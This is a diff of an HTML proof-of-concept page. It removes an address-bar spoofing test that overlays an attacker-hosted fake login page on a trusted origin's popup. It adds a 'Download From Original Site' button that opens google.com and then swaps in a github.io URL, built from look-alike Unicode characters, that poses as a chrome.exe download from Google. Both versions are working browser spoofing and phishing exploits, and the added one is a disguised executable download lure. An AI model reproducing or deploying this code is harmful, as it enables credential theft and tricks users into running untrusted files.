@@ -1,47 +1,30 @@
-<!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>Address Bar Spoofing PoC</title>
+ <head> 
+  <meta charset="utf-8">
 <style>
-body { font-family: Arial; text-align:center; margin-top:80px; }
-iframe { width:90%; height:80vh; border:1px solid #ccc; }
-.note { color:red; font-size:13px; margin-bottom:10px; }
-</style>
-
-<script>
-function go() {
-    // Open trusted origin
-   var win = window.open('https://instagram:90');
-
-    if (!win) {
-        alert("Popup blocked");
-        return;
-    }
-
-    setTimeout(function () {
-        try {
-            // Replace document with attacker content (iframe only)
-            win.document.open();
-            win.document.write(`
-                <p class="note">
-                    Demo: Address bar shows google.com, but content below is attacker-controlled.
-                </p>
-
-                <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
-            `);
-            win.document.close();
-
-        } catch (e) {
-            console.log("Blocked:", e);
-        }
-    }, 3000);
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
 }
-</script>
-</head>
-
-<body>
-<h2>Firefox iOS Address Bar Spoofing Test</h2>
-<button onclick="go()">Start Test</button>
-</body>
+</style>
+ </head> 
+ <body> 
+  <script>
+function a(){
+    window.open('https://google.com', 'x');
+    setTimeout(function(){
+        window.open('https://ecdnts-del.github.io/test-apk/From%20https%E2%88%B6%E2%A7%B8%E2%A7%B8google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe', 'x');
+    }, 5000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
 </html>
